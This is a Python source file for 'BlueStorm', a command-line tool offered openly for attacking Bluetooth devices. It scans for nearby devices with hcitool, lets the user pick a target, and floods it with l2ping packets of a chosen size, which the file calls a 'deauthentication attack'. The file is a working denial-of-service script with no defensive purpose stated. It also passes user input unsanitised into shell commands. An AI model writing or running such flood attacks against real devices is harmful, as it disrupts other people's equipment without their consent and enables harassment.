# BlueStorm
# A tool which perform deauthentication attack on unpaired bluetooth devices.
# Author - WireBits

import os
import time
import subprocess

def get_bluetooth_interface():
    os.system('clear')
    logo()
    print("")
    interfaces = subprocess.check_output("hciconfig | grep -E 'hci[0-9]+:|Bus|UP RUNNING|DOWN'", shell=True, text=True)
    print("Available Bluetooth Interfaces:")
    print("")
    print(interfaces)
    interface = input("Enter the Bluetooth interface (e.g., hci0): ")
    return interface

def scan_attack():
    logo()
    while True:
        menu()
        choice = input("|-->Enter your choice (1 or 2) > ")
        if choice == '1':
            bluetooth_interface = get_bluetooth_interface()
            break
        elif choice == '2':
            print("Exiting...")
            exit(0)
        else:
            print("Invalid choice! Please enter 1 or 2.")

    time.sleep(0.1)
    os.system('clear')
    logo()
    print("")
    print("Scanning...")
    print("")
    bluetooth_scan = subprocess.check_output(f"hcitool -i {bluetooth_interface} scan", shell=True, stderr=subprocess.STDOUT, text=True)
    lines = bluetooth_scan.splitlines()
    id = 1
    del lines[0]
    array = []
    print("ID   MAC Address           Device Name       ")
    print("")
    for line in lines:
        info = line.split()
        device_mac = info[0]
        device_name = ' '.join(info[1:])
        array.append(device_mac)
        print("{}    {}     {}          ".format(id, device_mac, device_name))
        id += 1
        print("")
    target_id = input('Target ID or MAC Address > ')
    try:
        target_address = array[int(target_id) - 1]
    except IndexError:
        target_address = target_id

    if len(target_address) < 1:
        print('[!] Target address is missing!')
        exit(0)
    try:
        packet_size = int(input('Packet Size (Max : 600) > '))
    except ValueError:
        print('[!] Packet size must be an integer!')
        exit(0)
    print("")
    os.system('clear')

    for i in range(0, 3):
        countdown_message = f"[*] Starting deauthentication attack in {3 - i} seconds..."
        print(countdown_message, end='\r')
        time.sleep(1)
    os.system('clear')
    print("[*] Attack Started!")
    try:
        os.system(f'l2ping -i {bluetooth_interface} -s {packet_size} -f {target_address}')
    except KeyboardInterrupt:
        print("\n[*] Attack Aborted!")

def menu():
    print('')
    print("+------------------+")
    print("|-Choose an option-|")
    print("+------------------+")
    print("|-->1. Scan and attack")
    print("|-->2. Quit")

def logo():
    print("\t\t\t\t\t\t+-------------------------------+")
    print("\t\t\t\t\t\t|--╔╗ ╦  ╦ ╦╔═╗╔═╗╔╦╗╔═╗╦═╗╔╦╗--|")
    print("\t\t\t\t\t\t|--╠╩╗║  ║ ║║╣ ╚═╗ ║ ║ ║╠╦╝║║║--|")
    print("\t\t\t\t\t\t|--╚═╝╩═╝╚═╝╚═╝╚═╝ ╩ ╚═╝╩╚═╩ ╩--|")
    print("\t\t\t\t\t\t|Bluetooth Deauthentication Tool|")
    print("\t\t\t\t\t\t+-------------------------------+")

if __name__ == '__main__':
    try:
        os.system('clear')
        scan_attack()
    except KeyboardInterrupt:
        time.sleep(0.1)
        print('\n[*] Aborted')
        exit(0)
    except Exception as e:
        time.sleep(0.1)
        print('[!] ERROR: ' + str(e))
